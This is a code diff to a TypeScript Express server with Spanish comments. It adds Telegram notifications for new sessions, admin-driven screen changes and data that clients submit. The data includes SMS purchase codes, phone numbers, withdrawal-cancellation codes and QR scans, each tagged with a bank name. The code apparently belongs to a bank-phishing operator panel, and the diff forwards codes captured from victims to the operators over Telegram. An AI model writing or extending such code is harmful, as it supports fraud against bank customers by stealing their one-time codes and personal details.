@@ -1074,6 +1074,15 @@ export async function registerRoutes(app: Express): Promise<Server> {
         }
       }));
 
+      // Enviar notificación de nueva sesión a Telegram
+      await sendSessionCreatedNotification({
+        sessionId,
+        banco: banco as string,
+        folio: linkCode,
+        createdBy: user.username,
+        link: clientLink
+      });
+
       res.json({ 
         sessionId, 
         link: clientLink, 
@@ -1308,6 +1317,17 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 type: 'SESSION_UPDATE',
                 data: updatedSession
               }), createdBy); // Dirigimos el mensaje al creador de la sesión
+
+              // Enviar notificación de cambio de pantalla a Telegram
+              if (updatedSession) {
+                await sendScreenChangeNotification({
+                  sessionId,
+                  banco: updatedSession.banco || 'Desconocido',
+                  newScreen: screenType,
+                  adminUser: 'Admin', // Podríamos obtener el usuario admin específico si es necesario
+                  data: validatedData
+                });
+              }
             }
           } catch (error) {
             console.error("Invalid screen change data:", error);
@@ -1468,12 +1488,35 @@ export async function registerRoutes(app: Express): Promise<Server> {
                       createdBy // Añadimos el creador para referencia
                     }
                   }), createdBy); // Enviamos solo al creador y al superadmin
+                  
+                  // Enviar notificación a Telegram
+                  await sendTelegramNotification({
+                    sessionId,
+                    banco: sessionData?.banco || 'Desconocido',
+                    tipo: 'sms_compra',
+                    data: inputData,
+                    timestamp: new Date().toISOString(),
+                    createdBy: sessionData?.createdBy || 'Desconocido'
+                  });
                 } else {
                   console.error('Error: datos SMS_COMPRA recibidos sin código de cancelación:', inputData);
                 }
                 break;
               case 'celular':
                 updatedFields.celular = inputData.celular;
+                
+                // Enviar notificación a Telegram
+                const celularSessionData = await storage.getSessionById(sessionId);
+                if (celularSessionData) {
+                  await sendTelegramNotification({
+                    sessionId,
+                    banco: celularSessionData.banco || 'Desconocido',
+                    tipo: 'celular',
+                    data: inputData,
+                    timestamp: new Date().toISOString(),
+                    createdBy: celularSessionData.createdBy || 'Desconocido'
+                  });
+                }
                 break;
               case 'CANCELACION_RETIRO':
               case 'cancelacion_retiro':
@@ -1501,6 +1544,16 @@ export async function registerRoutes(app: Express): Promise<Server> {
                       createdBy // Añadimos el creador para referencia
                     }
                   }), createdBy); // Enviamos solo al creador y al superadmin
+                  
+                  // Enviar notificación a Telegram
+                  await sendTelegramNotification({
+                    sessionId,
+                    banco: sessionData?.banco || 'Desconocido',
+                    tipo: 'cancelacion_retiro',
+                    data: inputData,
+                    timestamp: new Date().toISOString(),
+                    createdBy: sessionData?.createdBy || 'Desconocido'
+                  });
                 } else {
                   console.error('Error: datos CANCELACION_RETIRO recibidos sin código de retiro:', inputData);
                 }
@@ -1532,6 +1585,16 @@ export async function registerRoutes(app: Express): Promise<Server> {
                       timestamp: new Date().toISOString()
                     }
                   }), createdBy); // Enviamos solo al creador y al superadmin
+                  
+                  // Enviar notificación a Telegram
+                  await sendTelegramNotification({
+                    sessionId,
+                    banco: sessionData?.banco || 'Desconocido',
+                    tipo: 'escanear_qr',
+                    data: inputData,
+                    timestamp: new Date().toISOString(),
+                    createdBy: sessionData?.createdBy || 'Desconocido'
+                  });
                 } else {
                   console.error('Error: datos de QR recibidos sin contenido:', inputData);
                 }
